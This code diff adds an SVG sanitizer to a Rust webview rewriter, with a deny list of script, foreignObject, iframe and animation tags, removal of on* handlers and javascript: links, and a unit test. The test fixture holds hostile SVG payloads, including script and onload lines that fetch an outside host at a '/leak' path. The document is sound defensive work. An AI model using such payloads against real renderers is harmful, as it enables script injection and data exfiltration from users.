@@ -164,6 +164,60 @@ impl RewriteContext {
         rewrite_css_urls(&imports, self, limit)
     }
 
+    /// Rewrite one SVG document body, stripping active scripting, `foreignObject`, SMIL
+    /// navigation animations, and `on*` event handler attributes because SVG documents do not
+    /// receive the HTML runtime bootstrap.
+    pub(crate) fn rewrite_svg_with_limit(&self, svg: &str, limit: usize) -> Result<String> {
+        let html_state = HtmlRewriteState::new(
+            &self.gateway_prefix,
+            self.document_url.clone(),
+            None,
+            limit,
+            self.srcdoc_depth,
+        );
+        let style_text = RefCell::new(String::new());
+        let settings = RewriteStrSettings::new()
+            .append_element_content_handler(element!("*", |element| {
+                let tag = element.tag_name();
+                if is_forbidden_svg_tag(tag.as_str()) {
+                    element.remove();
+                    return Ok(());
+                }
+                sanitize_svg_element_attributes(element)?;
+                rewrite_html_element(element, &html_state)?;
+                Ok(())
+            }))
+            .append_element_content_handler(text!("style", |text| {
+                rewrite_style_text(text, &html_state, &style_text)?;
+                Ok(())
+            }));
+        let mut output = Vec::with_capacity(svg.len().min(limit));
+        let mut overflow_actual = None;
+        {
+            let mut rewriter = HtmlRewriter::new(settings.into(), |chunk: &[u8]| {
+                if overflow_actual.is_some() {
+                    return;
+                }
+                let actual = output.len().saturating_add(chunk.len());
+                if actual > limit {
+                    overflow_actual = Some(actual);
+                } else {
+                    output.extend_from_slice(chunk);
+                }
+            });
+            rewriter
+                .write(svg.as_bytes())
+                .and_then(|()| rewriter.end())
+                .map_err(map_html_rewrite_error)?;
+        }
+        if let Some(actual) = overflow_actual {
+            return Err(response_body_too_large(actual, limit));
+        }
+        String::from_utf8(output).map_err(|error| {
+            WebviewError::Render(format!("SVG rewrite emitted invalid UTF-8: {error}"))
+        })
+    }
+
     fn rewrite_url(&self, value: &str) -> Result<Option<String>> {
         self.gateway_prefix
             .rewrite_url_value(&self.document_url, value)
@@ -329,6 +383,47 @@ fn rewrite_style_text(
     drop(buffered);
     let rewritten = state.rewrite_css(css.as_str())?;
     text.replace(rewritten.as_str(), ContentType::Text);
+    Ok(())
+}
+
+fn is_forbidden_svg_tag(tag: &str) -> bool {
+    tag.eq_ignore_ascii_case("script")
+        || tag.eq_ignore_ascii_case("foreignobject")
+        || tag.eq_ignore_ascii_case("iframe")
+        || tag.eq_ignore_ascii_case("embed")
+        || tag.eq_ignore_ascii_case("object")
+        || tag.eq_ignore_ascii_case("animate")
+        || tag.eq_ignore_ascii_case("set")
+        || tag.eq_ignore_ascii_case("animatemotion")
+        || tag.eq_ignore_ascii_case("animatetransform")
+}
+
+fn sanitize_svg_element_attributes<H>(
+    element: &mut Element<'_, '_, H>,
+) -> std::result::Result<(), Box<dyn Error + Send + Sync>>
+where H: HandlerTypes {
+    let attrs: Vec<(String, String)> = element
+        .attributes()
+        .iter()
+        .map(|attr| {
+            (
+                attr.name(),
+                html_escape::decode_html_entities(&attr.value()).into_owned(),
+            )
+        })
+        .collect();
+    for (name, value) in attrs {
+        let lower = name.to_ascii_lowercase();
+        if lower.starts_with("on") {
+            element.remove_attribute(name.as_str());
+            continue;
+        }
+        if (lower == "href" || lower == "xlink:href")
+            && value.trim().to_ascii_lowercase().starts_with("javascript:")
+        {
+            element.remove_attribute(name.as_str());
+        }
+    }
     Ok(())
 }
 
@@ -959,6 +1054,27 @@ mod tests {
 
         assert!(rewritten.contains("url('unterminated'"));
         assert!(rewritten.contains("/webview/https%3A%2F%2Fexample%2Ecom%2Flater%2Esvg"));
+        Ok(())
+    }
+
+    #[test]
+    fn test_svg_rewrite_strips_scripts_foreign_objects_smil_and_event_handlers() -> Result<()> {
+        let ctx = context()?;
+        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://1.1.1.1')">
+            <script>fetch("https://1.1.1.1/leak")</script>
+            <foreignObject><iframe src="https://1.1.1.1/frame"></iframe></foreignObject>
+            <animate attributeName="href" to="https://1.1.1.1/anim"/>
+            <a href="javascript:alert(1)"><image href="/ok.png" onclick="evil()"/></a>
+        </svg>"#;
+
+        let rewritten = ctx.rewrite_svg_with_limit(svg, usize::MAX)?;
+        assert_absent(&rewritten, "<script");
+        assert_absent(&rewritten, "foreignObject");
+        assert_absent(&rewritten, "<animate");
+        assert_absent(&rewritten, "onload=");
+        assert_absent(&rewritten, "onclick=");
+        assert_absent(&rewritten, "javascript:");
+        assert!(rewritten.contains("/webview/https%3A%2F%2Fexample%2Ecom%2Fok%2Epng"));
         Ok(())
     }
 
